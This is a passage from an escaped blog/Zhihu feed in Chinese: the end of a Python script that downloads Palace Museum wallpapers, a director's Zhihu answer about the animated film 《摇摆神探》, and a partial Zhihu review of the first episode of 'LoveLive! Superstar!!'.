class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"如何评价动画电影《摇摆神探》？","date":"2021-07-16 15:30:10","description":"\n<p>感谢邀约，由我导演的动画电影《摇摆神探》明天7月17日就要上映了，回想当时为什么会做这部电影、还有团队创作中的过程的很多人，很多事、感受颇多，想和大家分享一些创作这部电影时的初衷。《摇摆神探》以摇摇车为主⾓的动画电影，讲的是⼀辆幻想自己是“英雄”的、与众不同的摇摇车“摇摆”是如何从绑匪⼿中营救男孩“小奇”的历险故事。电影概念是以儿童守护陪伴的主题， 创作初衷，是希望向传递，孩子童年成长过程中不可或缺的亲情守护陪伴……</p>\n<p>以下内如部分略微涉及剧透：</p>\n<p>男孩“⼩奇”和摇摇车“摇摆”是在游乐园相遇，原本一家人相约游乐场，父母又因工作中途缺席，小奇自己进入了游乐场，却被早有预谋的绑匪盯上。</p>\n<p><b>游乐园形单影只的男孩，像是是当下很多家庭现状的影子……</b>男孩“⼩奇”的⽗母整体忙于工作，对他疏于陪伴，这像是当今很多家庭的现状：每个孩子的童年都一段短暂、宝贵、独特的成长时光，这段时光的亲情陪伴对孩子的成长塑造不可或缺，孩子也会因缺乏这份陪伴而孤独。 </p>\n<p>影片中，在男孩小奇生日当天，原本一家⼈相约游乐园，⽗母却又因⼯作忙碌中途缺席。虽然父母日常忙于事业，早已在物质方面为小奇配备了高端玩具、电子设备、保镖看护等等，大多数人看来孩子这样的童年生活已经很丰富了。然而，成长路上长期缺乏陪伴的孩子并不会真正的快乐，大人们时常因忙碌难以倾听孩子内心的真实感受、容易忽视孩子渴望陪伴的诉求。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a3f62cc80cfd0b169360aa775591626c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5713\" data-rawheight=\"2480\" data-watermark=\"watermark\" data-original-src=\"v2-a3f62cc80cfd0b169360aa775591626c\" data-watermark-src=\"v2-d600674d86c242832e7de0b6ac3c77d3\" data-private-watermark-src=\"v2-c03f7ddda729d85b175130fd20b487d9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-852324bb7142fa5d01e9dacce5c4c1ab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-852324bb7142fa5d01e9dacce5c4c1ab\" data-watermark-src=\"v2-6bb8ea6f29136a63847e99825c125280\" data-private-watermark-src=\"v2-bdd62cf3f8a6316ebfbde891b96e7bf2\"></p>\n<p>顺带插一句：男孩小奇的形象设计，参考并融合了现实中多位明星童年出道时的样子，大家觉得像哪一位？</p>\n<p>原本一场全家人欢乐的游玩，父母却突然缺席，此刻小奇仍然是孤独的，但男孩不理解自己不开心的深层原因，而是选择了自己去寻找答案：小男孩不知不觉独自来到了游乐园……他在游乐园遇见了很多新奇好玩的设施玩具、也遇到了其他陪伴孩子玩耍的三口之家，更遇见了童年的摇摇车，回忆起很小的时候自己坐在摇摇车上，父母在旁陪伴嬉闹的情形。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9a95645d7315142ef52fe47e672a9b0f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-9a95645d7315142ef52fe47e672a9b0f\" data-watermark-src=\"v2-549e78a6df9bf5898adb1483127fa83f\" data-private-watermark-src=\"v2-f83f67373c83ace25abc773adfe3e9b1\"></p>\n<p><br></p>\n<p>这段电影剧情，男孩小奇与神奇摇摇车“摇摆”看似不期而遇，实则充满必然！因为游乐园往往正是孩子在家人陪伴下的游玩场所，这种亲情陪伴是小奇内心潜在的强烈诉求，而这些看似简单的童年守护陪伴正是当今的孩子、父母所需的。</p>\n<p>在电影后续剧情中，男孩遭遇绑匪，摇摇车挺身而出开展营救，他们一起与坏人在游乐园展开周旋，开启了一场紧张而欢乐的冒险。摆脱危险困境后，在傍晚落日下的海边沙滩，摇摇车更化身为男孩的快乐陪伴担当。此时此刻，摇摇车“摇摆”所扮演的守护孩子安全、暖心欢乐陪伴等等一系列举动，不正是父母在孩子童年成长中不可或缺的守护陪伴？</p>\n<p><b>这段摇摇车营救故事，想传递童年里不可或缺的亲情守护陪伴  </b>如今快生活节奏大环境下，家庭娱乐的方式越来越多，很多父母也愈加习惯用物质方式解决孩子成长路上的问题，如更智能的玩具、早教、电子产品等等，在这样的大环境下，孩子也在快速成长并学会自己解决问题、寻找答案。如之前说的，每个孩子的童年都一段短暂、宝贵、独特的成长时光，而这段父母亲情守护陪伴的记忆和对孩子的影响，即使多年后孩子长大了仍然深刻……</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0577e9724a33c970a67af88dc58ab999_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1409\" data-rawheight=\"748\" data-watermark=\"watermark\" data-original-src=\"v2-0577e9724a33c970a67af88dc58ab999\" data-watermark-src=\"v2-41fa95c1423c730ca0b565e5802ba6c8\" data-private-watermark-src=\"v2-d49e029ed11dce689a07615580f2b1c9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c1fcecbac6e7d5e0206e1d3a1b4c3342_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-c1fcecbac6e7d5e0206e1d3a1b4c3342\" data-watermark-src=\"v2-a35d08dc42c66ddd638a9cc2d4cff43c\" data-private-watermark-src=\"v2-4ff692503e44957b486a01b7b54ce898\"></p>\n<p>我本人是79年的、还有编剧邓伟峰等创作团队成员都是80后，其实吧，那个年代的孩子大多经历过类似的童年孤独状态：比如父母忙于工作、时常让孩子一个人在家，因为大多是独生子，孩子本就缺少兄弟姐妹成长陪伴、却常与玩具作伴……</p>\n<p>在那个电子娱乐缺乏的年代，虽然没有当下那么丰富的娱乐方式，但对童年成长过程中、那段父母陪伴的记忆都尤为深刻！那时候的童年快乐很简单，即使父母偶尔陪孩子公园玩一天，真的能高兴很久很久</p>\n<p> 《摇摆神探》讲的是神奇摇摇车去营救男孩的欢乐冒险故事，而电影想传递的童年守护陪伴、不只是守护儿童的身心安全，更是孩子成长路上不可或缺的父母亲情陪伴！这年头啊，每个家庭在品类繁杂的城市娱乐中有了更多选择，父母陪孩子玩摇摇车的情形小时候到时很常见到……现在还多吗?</p>\n<p>这一次，曾经陪伴无数人童年的摇摇车在电影里“活”了，我想对于很多像我们这样的大孩子来说也算是一种童年追忆吧。</p>\n<p>好了 ，不知不觉说了那么多  ，我们在设计摇摇车“摇摆”的故事时出过很多有趣的想法，感触很多，看着大伙做了这么久的片子明天就要上映了，希望大家喜欢，可能会从中回忆起什么也说不定，希望大家都能从中得到快乐</p>\n<p><br></p>\n<p>--分割线---</p>\n<p><br></p>\n<p>《摇摆神探》已如期上映，感谢朋友们的评论和关注！小时候孩子们都爱的摇摇车首登大银幕……如前文所说，电影希望传递童年里不可或缺的亲情守护陪伴，但同样，这部电影本质是一场欢乐的、轻松的营救冒险，今天想和大家分享 摇摇车、游乐园设定初衷，相信曾今的大孩子们或许会会心一笑？</p>\n<p><b>主角“摇摇车”设计怎样考虑的？</b>我们的主⾓“摇摆”是一辆在游乐园、冰激凌店前的投币摇摇车，ta是超级欢乐的角色，这辆摇摇车整天都幻想着⾃⼰是⼀名惩恶扬善的神探，影片开始部分，多次呈现摇摇车脑海中“YY幻想”的片段，当看到小孩被坏人绑架陷入危险，它像超级英雄一样飞驰而去，三下五除二摆平坏人，享受着无数人对自己投来的夸赞敬仰……这些看似“白日梦”的片段将孩子们天生具备的、既童趣且正能量的“英雄幻想”都具象化了，说道这里，各位大孩子们会不会觉得既熟悉又可爱？哈哈</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6357f1a39a2c352870893d3589ca9120_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1137\" data-rawheight=\"641\" data-watermark=\"watermark\" data-original-src=\"v2-6357f1a39a2c352870893d3589ca9120\" data-watermark-src=\"v2-713a9c766674284d3ce422093385dbf2\" data-private-watermark-src=\"v2-f0a80b0b70995e1ababfd116b1a9ebd7\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d96cfea7f2c0796d1c29647e08222ad9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1137\" data-rawheight=\"641\" data-watermark=\"watermark\" data-original-src=\"v2-d96cfea7f2c0796d1c29647e08222ad9\" data-watermark-src=\"v2-174d1de67b1c9157cdcd04b45bcb2427\" data-private-watermark-src=\"v2-31bbf697256f0da79ef76bff64c607b9\"></p>\n<p>摇摇车，曾经承载了无数人童年记忆其本身就很充满故事性，在父母陪伴下玩遍游乐园、乘坐摇摇车玩遍游乐项目曾是多少孩子的童年快乐啊？每个孩子小时候具有“主动将物体活化”的想象力：谁不曾幻想自己驾驭的玩具活起来，变成自己的超级英雄伙伴？谁的童年没有一个英雄梦，幻想自己就是打击犯罪，锄强扶弱的正义使者？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-de1a30094d09e8dff0c4554ed77d3a23_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"711\" data-watermark=\"watermark\" data-original-src=\"v2-de1a30094d09e8dff0c4554ed77d3a23\" data-watermark-src=\"v2-f2d82cd5c21b32ebe9505dbe4f5a003e\" data-private-watermark-src=\"v2-b39309c1e5bc72a10f50227fc3d2cd2c\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-44df23caff2f55eea188221c8677ab7f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1048\" data-watermark=\"watermark\" data-original-src=\"v2-44df23caff2f55eea188221c8677ab7f\" data-watermark-src=\"v2-0df7c96335a1a3cdb5fb2ecc6d18fab6\" data-private-watermark-src=\"v2-22be081fd7a7b2ae126b72c93b0ad9f5\"></p>\n<p>摇摆的最初设定：有一位只存在于摇摇车意识中的超级英雄，影片最终虽然没有呈现这一设定，但摇摇车外形保留了这位幻想英雄的外形元素。</p>\n<p>我们首先确认主角“摇摆”，摇摇车融合了童趣、童年陪伴、英雄感等元素。设计它的形象希望既符合孩子童年纯真的幻想，也具有超级英雄的影子……最终，我们让摇摇车车身通体红色犹如超人的斗篷，还加入了五角星标志，还有警灯、警笛等道具…关于为什么摇摇车会加入“警车”元素？小时候看警匪片并曾幻想自己是警察警探、正义使者的大男孩们，看后一定会感到熟悉吧…</p>\n<p><b>角色、场景众多，我们望这场游乐园营救冒险欢乐有趣</b> 玩遍游乐园项目不论对孩子、大人是都是很欢乐很神往的事（尤其小的时候，玩游乐园哪有什么金钱概念？哈哈）电影里我们设计了很多新奇有趣的场景、游戏设施，比如5D影院、水晶峰滑雪场、摩天轮、大迷宫等等……很多天马行空想法因电影篇幅不能一一呈现，相信不论是新生代的小观众、还是曾经热衷买票投币、玩遍游乐设施的大朋友看到这些，都会感到欢乐吧</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d2df735e4cc9b6e028c46d4e98802b34_720w.jpeg?rss\" data-caption=\"水晶峰概念图\" data-size=\"normal\" data-rawwidth=\"2460\" data-rawheight=\"1466\" data-watermark=\"watermark\" data-original-src=\"v2-d2df735e4cc9b6e028c46d4e98802b34\" data-watermark-src=\"v2-51290ea6f9938c7e9232a2cdf1de310b\" data-private-watermark-src=\"v2-f7bf773dc4f6b5d64541221b3893f8b0\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b15a43929a9e097ab307950dd2e03817_720w.jpeg?rss\" data-caption=\"5D动感影厅概念图\" data-size=\"normal\" data-rawwidth=\"1200\" data-rawheight=\"590\" data-watermark=\"watermark\" data-original-src=\"v2-b15a43929a9e097ab307950dd2e03817\" data-watermark-src=\"v2-06d990bc5acbc21c6f7b9565ab9eb1ed\" data-private-watermark-src=\"v2-6056555eebb64d38250122d9c78fd647\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-11ef0a42cc808b897cc608d52eb52276_720w.jpeg?rss\" data-caption=\"游乐园夜景概念图\" data-size=\"normal\" data-rawwidth=\"2070\" data-rawheight=\"1344\" data-watermark=\"watermark\" data-original-src=\"v2-11ef0a42cc808b897cc608d52eb52276\" data-watermark-src=\"v2-0ca2efc9fb0afa48b00d5702d2332c52\" data-private-watermark-src=\"v2-e09383ed0db4e87e6dff2913e986f68b\"></p>\n<p>游乐园众多设施的设定，都是有生命且性格鲜明的角色，它们演绎着整个游乐园的众生百态：“摇摆”营救晚上必须要“睡美人觉”的旋转木马“公主”、加班过劳梦游症的“火车大叔”等等。 </p>\n<p>电影后续剧情中，摇摆在游乐园的维修间认识了新伙伴——它们自称“金牌护卫队”却只是以前游乐园的、年久失修疑似被人遗弃的玩具汽车，它们后来成为主人公营救男孩、对坑坏人的重要同伴。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1574fb144632bd30424b25046177f360_720w.jpeg?rss\" data-caption=\"摇摇车与火车大叔对话 概念图，火车大叔的这段对白堪称名场面\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-1574fb144632bd30424b25046177f360\" data-watermark-src=\"v2-f0106b23d38b3edb685d12877ea74e4a\" data-private-watermark-src=\"v2-6ed136ec4d24f6d324a412da346a76df\"></p>\n<p>在此，我们在电影里也呈现了游乐园的另外一面，加入了些许对童年游乐园、玩具设施等等宿命轮回的思考：是否随着童年过去、时代岁月变迁，曾经陪伴我们并为我们童年带来欢乐的一些东西，会被逐渐遗忘遗弃？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f6675a8709b29b70f94385229e11afed_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-f6675a8709b29b70f94385229e11afed\" data-watermark-src=\"v2-29f439423a6107e2a507cf0e6c84b155\" data-private-watermark-src=\"v2-58b54adf1393d57b0a62ecb1ae142d12\"></p>\n<p>“金牌护卫队”成员都是游乐园过去、年久失修被“遗忘遗弃”的玩具车，老大叫“杜宾”车体还少了一个前轮 。ta们的形象设计加入了当今小朋友喜爱的遥控车元素</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c3b4eb870cc4720b8744ff1fa25a5ff9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"726\" data-rawheight=\"500\" data-watermark=\"watermark\" data-original-src=\"v2-c3b4eb870cc4720b8744ff1fa25a5ff9\" data-watermark-src=\"v2-9f5cee7d5f65bab2047ad3f6267083aa\" data-private-watermark-src=\"v2-8e12a410a1c9f270241762d07e74f97e\"></p>\n<p>写在最后， 其实，我们想在电影里表达很多东西，透过摇摇车我们缅怀童年的欢乐，现在的孩子或许也能理解体验我们曾经当年的童年快乐，“摇摆”营救孩子过程中不断解锁的层层场景关卡，像不像小时候玩游乐园的“闯关”的感觉？加班过劳“梦游症”火车大叔等等很多角色，也有现实中人生百态趣味调侃……电影《摇摆神探》已如期上映，电影整体是欢乐冒险的基调，也带了些许对童年守护陪伴的思考，希望观众朋友们都能从中得到快乐 。我们缅怀童年的快乐，同样，我们期望美好的亲情守护陪伴时光……</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhu-jiang-6-41?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">凨木猪</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469062064/answer/2002161426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20685563?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电影《神探》中刘青云看到人心里的鬼，为什么出主意的都是女性？</a><br><a href=\"http://www.zhihu.com/question/49325102?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价香港电影《神探》？</a><br>\n","link":"http://www.zhihu.com/question/469062064/answer/2002161426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021七月新番《LoveLive! Superstar!!》？","date":"2021-07-16 11:30:10","description":"\n<p>星团的第一集从我个人的角度来说，属于是那种你能感受到许多不同于正面战场前两作，能够一些新鲜空气的单集;是能感受到在虹色游击队(虹咲企划在所谓法统层面上相对缺少一些继承关系)与法统爱生活完成统一战线与法统梳理下，虹军游击队的讲习所对正面战场带来积极作用的单集。</p>\n<p>但是星团的第一集同样让我觉得是一个在新鲜感褪去进入到激情的思考时会怀疑是否真的在起点完成了一部分革新的单集;是察觉到结构变化反倒很大程度上影响到作品情绪抒发与剧情感官的单集;也是总感觉缺少一块足够的长板去让人忘记不足的单集。</p>\n<p><b>总结性的预言一下，我觉得星团既很可能是法统核心里最适合于今天的那一个，也很可能成为爱生活系列的“清末新政”的那一个，但基本不可能完成达到为爱生活系列带来各种积极方面大幅扭转的那一个，能不能赶上虹色游击队都需要祈祷花田能在自己擅长的方向发挥正常＋企划本身的条条框框能少一点以及足够的配置与运气。（注：笔者真不懂爱生活，没玩过LLAS，虽然奉行雨野罪大恶极但是也不算熟悉剧情，一切对照都基于动画本体）</b></p>\n<hr>\n<ol>\n<li><b>告别了废校废部是否意味着改变了启动机制？？</b></li>\n<li><b>当传统的中段变成开头时，能否得到足够的回应？</b></li>\n<li><b>鲤鱼，此刻最大的短板，却不只是她的问题</b></li>\n<li><b>其他与总结</b></li>\n</ol>\n<h2>1.告别了废部废校是否意味着改变了启动机制？</h2>\n<p>许多朋友在谈论星团的第一集的时候，都会以本作第一集没有再提废部废校设定而把这个作为一个巨大的突破，emmmm，也许在玩梗方面你说的对，但是小声说一句:<b>《lovelive sunshine》的第一集也没有废部废校，类似的内容也只有学生会会长断然拒绝，果南对此支支吾吾。</b>而在星团第一集中，同样有学生会长严词拒绝，能否说真的告别了都难说。</p>\n<p>而且比形制上的废校废部来说，我们首先应该来看待另外一个问题：“在LL系列之中，被视为模板套皮的废部废校，是否每一次都起到了相似的作用，是否都是启动机制的一部分”。</p>\n<p>在缪中，的确音乃木阪的废校与为了让新入学人数增加而创办学园偶像部成为了果皇一切的切入点与传奇的起点。但是，不论是后续LLSS的浦女，还是虹咲会展中心兼国际机场，作品本身切入到学园偶像的起点本质上都是一个——<b>“薪火相传的感染力”</b>。</p>\n<p>浦女的学园偶像部的remake，其由头是蜜柑姐被缪斯的歌舞给dokidoki了，在蜜柑姐强大的精神属性与“死皮赖脸”的安利之下，成功将事态与旧有传统体系性危机——废校结合，同时击鼓传花一般的将问题切入到三年级三人组的旧有恩怨情仇。从复盘的角度，我们当然应该说，浦女的废校危机当然在在你水的重启中起到了重要作用，但是从整个启动机制来看，由头已经从缪系列废校废部为基础与源动力变成了一种戏剧性与偷梗的部分。在我看来，如果将有无废校废部就看做机制改进，那么我觉得将废校废部进行弱化矛盾，取消其核心源头的水团其实已经在reform的道路上走了一大步，甚至很大程度上，就第一集的启动逻辑来看，星团其实高度继承地是水团（但是确实在一些不常提到的地方有了不小变化）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-13b5d6b4792968990f9f5243abafdce5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-13b5d6b4792968990f9f5243abafdce5\" data-watermark-src=\"v2-ec326f5b9cb84a1bf1ce34da4b969f49\" data-private-watermark-src=\"v2-febe000c23ef8e40a27556a2cc1d2142\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-54e06a73c8de0f664f39496e9970672b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-54e06a73c8de0f664f39496e9970672b\" data-watermark-src=\"v2-6aea0214462003637922d04001aeaaa6\" data-private-watermark-src=\"v2-40752a86f1fdd93d55166bfef1db06a0\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-786249486f38cfe2e3c265d20e9b466f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-786249486f38cfe2e3c265d20e9b466f\" data-watermark-src=\"v2-f2de123a7ef3ebfd706ae8851875617d\" data-private-watermark-src=\"v2-d55eb819c80f86df33927c4972be31e0\"></p>\n<p>在启动机制方面，虹色游击队在我看来事实上算是我眼中改革更激进的那一个，但这一点也是因为其组织结构方面的完全差异性带来的，即“相较于缪的从零开始，水的断代重建，虹团动画的起点便是虹咲学园偶像同好会的骤然废部，此时其旧有框架完全保留，并不需要再上井冈山”。</p>\n<p>所以虹团的剧情起点是侑和步梦的闲聊逛街，被雪菜精彩的表现所感染而完成的传承，此处相当程度上继承了水团以来利用传承去构建由头的逻辑。但在本集按照一般校园社团番中的纠结与自我说服附带上废部的戏剧性之后，本集除去百合气息外最有特色的便是因为本集的节点选择，让其最后能以一串足够漂亮的群像剧剪影将同好会旧部的情况与废部的紧急事态相结合，甚至最后也因此将虹团第二集拍成了《第五共和国》似的小霞霞另立核心，带来了许多真正配得上意想不到却在合理之中充满着喜剧意味的戏剧性玩意儿。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a2496734361887379a6e6275b6b68067_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-a2496734361887379a6e6275b6b68067\" data-watermark-src=\"v2-00efedd306ea72afe77d59c49a754d62\" data-private-watermark-src=\"v2-4408c68a348bed89bd687bd190a45439\"></p>\n<p>那么星团呢？从第一集来看，至少从团队的启动层面来看，星团的启动机制近乎完全继承了水团以来<b>感染力的继承</b>这一核心逻辑，也与水团一样在主要矛盾尚未出现之时，便已经因为某一个“传教士”开启了剧情的运转，只不过这一次属于是西风东渐了（毕竟沪国当然在你日西边）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9742d758830a8206178c3af74514ef9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9742d758830a8206178c3af74514ef9a\" data-watermark-src=\"v2-36e005bd9007d171e271d03e5fb2c983\" data-private-watermark-src=\"v2-f15e66917a120210ba5a2cdada24875f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dd79f0e54af8a12fa19b8dd706d2724c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-dd79f0e54af8a12fa19b8dd706d2724c\" data-watermark-src=\"v2-81475b6ece48eb93749770882d631192\" data-private-watermark-src=\"v2-1f11c12d65108a3bb638251c7a9109ab\"></p>\n<p>在第一部分的最后还剩下一个问题，那便是“<b>什么是废校与废部？</b>”</p>\n<p>这一点看起来几乎没什么意义，但是作为一个干啥啥不行，就会和你掰扯来掰扯去概念的家伙，我觉得与其去抱怨为什么社团作品总是在废校、废部、找不齐人的矛盾，京吹那里搞一点“体育系社团阶级问题”都能时至今日变成ACG社区办公室政治与隐射文学的不倒素材，倒不如去想什么是。</p>\n<p>在笔者看来，废校废部这样的样板矛盾，本质上是“<b>利用一种强大而至少在矛盾初期难以被解决与解释的大而无当，或者是不需要知道有没有的外部压力，亦或是一定程度上的“他者”的凝视，来对剧情的运行去进行加速与规制</b>”。那么在这样的逻辑之下，现在的问题就变成了，这样的外部干预，究竟与LL系列中宛如世界真理一样的“<b>必然出现的对学园偶像抗拒的学生会长</b>”有着怎么样的区别了。</p>\n<p>而在我看来，这两者如果真的有什么区别，那大概便是<b>必然抗拒的学生会长</b>在LL系列中在完成了某种程度上的共情之后，便迅速地从一个本不存在的他者回归到团体内成员构建的想象界，并且进而在后续的个人部分让观众以一种错觉的认识去从一种拟态的“从想象界到实在界”的过程来获得观众对自身的投射。而不论是废校，废部，还是传统LL的lovelive大赛与绝大多数状态下的“敌团”，他们都基本上以一种他者的身份置于剧情之中，而最终LL的本体二团也确实在一系列他者的凝视之下，以一种强烈的规制及其驱力来运行。</p>\n<p>在这样的思路之下，废校废部的设计，与lovelive大赛亦或是一个遥远的目不可及的敌团来看，也没有什么明显的区别。而对比虹团初期与星团第一集中，lovelive project的宣传，广告板上隐隐约约的敌团要素，从合理推测的角度来看，纵使不再废部废校，在初期的构建中，依然具有着传统意义上管理层的科层制矛盾，在后续的发展中，依然具有着整套机制的他者凝视，其大体的方向也就八九不离十。</p>\n<p>毕竟，虹色游击队的前辈们，在第三集后相当程度上告别了这种主线剧情中的他者凝视之后给出的答案就是不断重复着一次又一次“从想象界到实在界”的拟态演出，最后用制造一个大他者（指打算开一个大聚会的计划）来完成对这种规制的回归。</p>\n<h3><b>2.当传统的中段变成开头时，能否得到足够的回应？</b></h3>\n<p>虽然上一部分从各种逻辑论证了对于改变废校废部逻辑的过度抬高的不合理，但是真的要说星团的第一集没有什么突破也确实不太对劲。</p>\n<p>在我看来，星团第一集最大的两个突破，第一个是将传统偶像作品的个人回的深层矛盾处置进行了一个激进的前置；第二个便是完成了立德与宣传机器分离。第二点与第三部分关系更紧暂且不提，先来说第一点。</p>\n<p>对照LL系列或者其他偶像动画的开篇，对于成团型偶像动画来说，初期，至少第一集的内容基本上都是既有团队的拉人+邂逅+团内人员过脸熟；而已成团的类型则也不太可能整的跟纯个人回一样似的，而也应该把第一集作为对于全团的展现与核心C位的强化。纵使是对于虹咲这种本质本格校园社团番+百合向的偶像作品，其在面对堪称本作真正主轴的侑与步梦的情感部分，本作的第一集也只是用一些迟疑和最后表层的共同意识来体现双方情感的不对等与后续的矛盾预定</p>\n<p><img src=\"https://pic2.zhimg.com/v2-60c199b712cadcfe1bfd19b05788784e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-60c199b712cadcfe1bfd19b05788784e\" data-watermark-src=\"v2-588a55f87a505f8935e49e1055e6d291\" data-private-watermark-src=\"v2-94d0d30e10fab5f8e85a8333675e0ac6\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-28b0420af5fd21888cc4e06ca54ca308_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-28b0420af5fd21888cc4e06ca54ca308\" data-watermark-src=\"v2-2229f99e3420a09b510278f9647c3a1d\" 